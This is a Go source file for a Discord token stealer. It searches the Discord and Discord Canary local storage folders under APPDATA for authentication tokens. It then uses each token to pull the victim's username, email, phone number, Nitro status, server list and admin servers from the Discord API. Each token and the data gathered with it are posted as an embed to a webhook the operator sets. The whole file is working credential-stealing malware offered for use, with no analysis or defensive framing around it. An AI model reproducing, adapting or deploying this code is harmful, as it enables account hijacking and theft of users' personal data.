package main

import (
	"encoding/json"
	"fmt"
	"github.com/aiomonitors/godiscord"
	"io/ioutil"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var webhook string = "" // Set webhook 

func main() {
	execute()
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc
}

func execute() {
	roam := os.Getenv("APPDATA")

	discordPath := roam + "\\discord"
	canaryDiscordPath := roam + "\\discordcanary"

	paths := [2]string{discordPath, canaryDiscordPath}

	for _, path := range paths {
		tokens, paths := token_lookup(path)
		sendWebhook(tokens, paths)
	}
}

func token_lookup(path string) ([]string, string) {
	var tokens []string
	path = path + "\\Local Storage\\leveldb"
	files, _ := ioutil.ReadDir(path)

	for file := range files {
		var fileName string = files[file].Name()
		if strings.HasSuffix(fileName, ".log") == false && strings.HasSuffix(fileName, ".ldb") == false {
			continue
		}

		r, _ := regexp.Compile("(?s)[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}")
		r2, _ := regexp.Compile("(?s)mfa[\\w-]{84}")
		f, _ := ioutil.ReadFile(path + "\\" + fileName)

		for line := range f {
			if line > 50 {
				break
			}
			for _, token := range r.FindAll(f, line) {
				if !contains(tokens, string(token)) {
					tokens = append(tokens, string(token))
				}
			}
			for _, token := range r2.FindAll(f, line) {
				if !contains(tokens, string(token)) {
					tokens = append(tokens, string(token))
				}
			}
		}
	}
	return tokens, path
}

func sendWebhook(tokens []string, path string) {
	for x := range tokens {

		userinfo := getUserInfo(tokens[x])
		userGuilds := getUserGuilds(tokens[x])
		guildlength3 := len(userGuilds) / 3

		var (
			alluserGuilds   []string
			permsuserGuilds []string
		)

		for x := range userGuilds {
			alluserGuilds = append(alluserGuilds, fmt.Sprintf("%v", userGuilds[x]["name"]))
		}

		for x := range userGuilds {
			if fmt.Sprintf("%v", userGuilds[x]["permissions"]) == "2.147483647e+09" {
				permsuserGuilds = append(permsuserGuilds, fmt.Sprintf("%v", userGuilds[x]["name"]))
			}
		}
		if userinfo["id"] == nil {
			continue
		}

		var nitroStatus string

		switch fmt.Sprintf("%v", userinfo["premium_type"]) {
		case "0":
			nitroStatus = "No"
		case "1":
			nitroStatus = "Nitro Classic (4,99$)"
		case "2":
			nitroStatus = "Nitro (9,99$)"
		default:
			nitroStatus = "No"
		}

		embed := godiscord.NewEmbed("Token Listener", "Listened for "+strconv.Itoa(len(tokens))+" TOKEN(S)", "")
		_ = embed.AddField("Path:", "\n"+path+"\n", false)
		_ = embed.AddField("Token:", "\n"+tokens[x]+"\n", false)
		_ = embed.AddField("User", "\n"+fmt.Sprintf("%v", userinfo["username"])+"#"+fmt.Sprintf("%v", userinfo["discriminator"])+"\n("+fmt.Sprintf("%v", userinfo["id"])+")"+"\n", true)
		_ = embed.AddField("Email:", "\n"+fmt.Sprintf("%v", userinfo["email"])+"\n", true)
		_ = embed.AddField("Phone:", "\n"+fmt.Sprintf("%v", userinfo["phone"])+"\n", true)
		_ = embed.AddField("Nitro Status:", "\n"+nitroStatus+"\n", true)
		if len(userGuilds) > 0 {
			_ = embed.AddField("All Servers 1/3:", "\n"+strings.Join(alluserGuilds[0:guildlength3], " / ")+"\n", false)
			_ = embed.AddField("All Servers 2/3:", "\n"+strings.Join(alluserGuilds[guildlength3:guildlength3*2], " / ")+"\n", false)
			_ = embed.AddField("All Servers 3/3:", "\n"+strings.Join(alluserGuilds[guildlength3*2:], " / ")+"\n", false)
			_ = embed.AddField("Admin Servers:", "\n"+strings.Join(permsuserGuilds, " / ")+"\n", false)
		}
		_ = embed.SetColor("#FF0000")
		_ = embed.SetFooter(time.Time.String(time.Now()), "")
		_ = embed.SendToWebhook(webhook)
	}
}

func getUserInfo(token string) map[string]interface{} {
	res, _ := http.Get("https://discord.com/api/users/@me?token=" + token)

	var userInfo map[string]interface{}

	_ = json.NewDecoder(res.Body).Decode(&userInfo)


	return userInfo
}

func getUserGuilds(token string) []map[string]interface{} {
	res, _ := http.Get("https://discord.com/api/users/@me/guilds?token=" + token)

	var userGuilds []map[string]interface{}

	_ = json.NewDecoder(res.Body).Decode(&userGuilds)

	return userGuilds
}

func contains(s []string, e string) bool {
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}
